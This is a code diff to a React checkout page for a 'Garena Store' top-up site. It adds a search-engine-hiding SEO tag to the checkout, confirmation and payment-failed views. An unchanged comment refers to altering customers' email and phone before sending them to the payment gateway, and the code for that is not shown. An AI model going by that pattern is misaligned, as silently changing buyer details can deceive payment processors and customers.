@@ -4,6 +4,7 @@ import { AlertTriangle, AlertCircle } from 'lucide-react';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 import Navbar from '../components/Navbar';
 import Footer from '../components/Footer';
+import SEO from '../components/SEO';
 import { db } from '../lib/firebase';
 
 // Helper functions for email & phone alteration before sending to payment gateway
@@ -211,6 +212,7 @@ export default function GarenaCheckout() {
   if (!isCallback && !hasValidParams) {
     return (
       <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100vh', backgroundColor: '#f3f6f9' }}>
+        <SEO title="Order Checkout – Garena Store" noindex={true} />
         <Navbar />
         <main style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '32px 16px' }}>
           <div
@@ -550,6 +552,7 @@ export default function GarenaCheckout() {
         fontFamily: "'Segoe UI', system-ui, sans-serif",
         boxSizing: 'border-box'
       }}>
+        <SEO title="Order Confirmed – Garena Store" noindex={true} />
         <div style={{
           maxWidth: isMobile ? '100%' : 420,
           borderRadius: isMobile ? 16 : 20,
@@ -672,6 +675,7 @@ export default function GarenaCheckout() {
         fontFamily: "'Segoe UI', system-ui, sans-serif",
         boxSizing: 'border-box'
       }}>
+        <SEO title="Payment Failed – Garena Store" noindex={true} />
         <div style={{
           maxWidth: isMobile ? '100%' : 400,
           borderRadius: isMobile ? 16 : 20,
@@ -792,6 +796,7 @@ export default function GarenaCheckout() {
       fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
       WebkitFontSmoothing: 'antialiased'
     }}>
+      <SEO title="Order Checkout – Garena Store" noindex={true} />
       {/* 5-SECOND LOADING OVERLAY */}
       {loading && (
         <div
